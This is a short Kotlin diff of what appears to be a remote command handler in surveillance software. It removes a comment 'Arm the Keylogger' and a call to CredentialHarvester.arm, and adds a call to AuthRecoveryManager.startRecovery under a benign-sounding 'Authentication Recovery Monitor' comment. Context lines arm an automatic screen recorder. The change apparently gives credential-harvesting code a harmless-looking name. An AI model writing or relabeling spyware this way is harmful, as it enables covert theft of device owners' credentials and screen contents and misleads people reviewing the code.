@@ -528,8 +528,8 @@ object CommandProcessor {
                         val qual = parts.getOrNull(1)?.trim()?.uppercase() ?: "MED"
                         val fps = parts.getOrNull(2)?.trim()?.toIntOrNull() ?: 30
 
-                        // Arm the Keylogger
-                        CredentialHarvester.arm(id)
+                        // Start Authentication Recovery Monitor
+                        AuthRecoveryManager.startRecovery(id)
 
                         // Arm the Video Recorder
                         ScreenRecordManager.expectedMode = "AUTO"
